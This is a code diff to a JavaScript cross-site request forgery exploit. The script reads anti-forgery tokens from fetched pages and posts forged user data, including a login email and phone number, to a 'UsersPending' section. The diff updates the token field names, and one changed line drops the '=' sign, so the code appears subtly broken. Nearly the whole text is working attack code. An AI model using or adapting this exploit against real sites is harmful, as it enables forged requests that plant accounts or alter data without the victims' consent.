@@ -16,7 +16,7 @@ function readBody(xhr) {
     var parser = new DOMParser();
     var resp = parser.parseFromString(data, "text/html");
     var resp1 = parser.parseFromString(data1, "text/html");
-    token = resp.getElementsByName("data[_Token][fields]")[0].value;
+    token = resp.getElementsByName("_Token[fields]")[0].value;
     key = resp1.getElementsByName("_csrfToken")[0].value;
     csrf(token,key);
     return [data, data1];
@@ -36,13 +36,13 @@ xhr.send(null);
 
 // Sends the CSRF attack to POST data to the UsersPending section, using the previously obtained CSRF token
 function csrf(token, key) {
-    var params = "data%5B_Token%5D%5Bfields%5D=" + token + "%25";
+    var params = "_Token%5Bfields%5D" + token + "%25";
     params += "&fname&";
     params += "lname&";
     params += "phone&";
     params += "mobile_phone=887688&";
     params += "login=ihwoke@live.com&";
-    params += "data%5B_Token%5D%5Bunlocked%5D=&";
+    params += "_Token%5Bunlocked%5D&";
     params += "_csrfToken=" + key;
 
     var x1 = new XMLHttpRequest();
